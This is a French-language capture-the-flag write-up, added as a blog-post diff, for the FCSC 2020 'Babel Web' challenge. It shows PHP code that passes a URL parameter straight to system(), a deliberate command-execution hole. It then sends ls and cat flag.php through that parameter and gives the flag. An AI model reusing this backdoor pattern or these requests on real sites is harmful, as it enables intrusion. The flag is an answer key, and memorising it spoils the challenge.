@@ -1,0 +1,85 @@
+---
+layout: post
+title:  "Writeup - FCSC-2020 - Intro - Babel Web"
+date:   2020-05-05 19:00:05 +0200
+categories: [writeup]
+author: Vixepti
+image: /assets/2020/05/FCSC.png
+tags: [FCSC, ctf, writeup, web]
+---
+
+Mon writeup sur l'épreuve *Babel Web* du *France Cybersecurity Challenge 2020*.<!--more-->
+
+# Énoncé
+> On vous demande d’auditer ce site en cours de construction à la recherche d’un flag.
+
+{:refdef: style="text-align: center;"}
+![Babel Web - Homepage](/assets/2020/05/babelweb-homepage.png)
+{: refdef}
+
+# Solution
+
+En examinant le code source de la page on a :
+
+{% highlight html %}
+<html>
+	<head>
+		<title>Bienvenue à Babel Web!</title>
+	</head>	
+	<body>
+		<h1>Bienvenue à Babel Web!</h1>
+		La page est en cours de développement, merci de revenir plus tard.
+		<!-- <a href="?source=1">source</a> -->
+	</body>
+</html>
+{% endhighlight %}
+
+En accédant à **_URL_/?source=1** :
+
+{% highlight php %}
+<?php
+    if (isset($_GET['source'])) {
+        @show_source(__FILE__);
+    }  else if(isset($_GET['code'])) {
+        print("<pre>");
+        @system($_GET['code']);
+        print("<pre>");
+    } else {
+?>
+<html>
+    <head>
+        <title>Bienvenue à Babel Web!</title>
+    </head>    
+    <body>
+        <h1>Bienvenue à Babel Web!</h1>
+        La page est en cours de développement, merci de revenir plus tard.
+        <!-- <a href="?source=1">source</a> -->
+    </body>
+</html>
+<?php
+    }
+?>
+{% endhighlight %}
+
+Donc si je veux afficher le contenu du dossier, je peux utiliser la commande *ls*.
+
+**_URL__/?code=ls**
+
+{% highlight shell_session %}
+flag.php
+index.php
+{% endhighlight %}
+
+Je peux donc afficher le flag en affichant le contenu du fichier avec *cat* :
+
+**_URL__/?code=cat%20flag.php**
+
+{% highlight php %}
+<pre><?php
+	$flag = "FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}";
+<pre>
+{% endhighlight %}
+
+# Flag
+
+Le flag est donc : ***FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}***
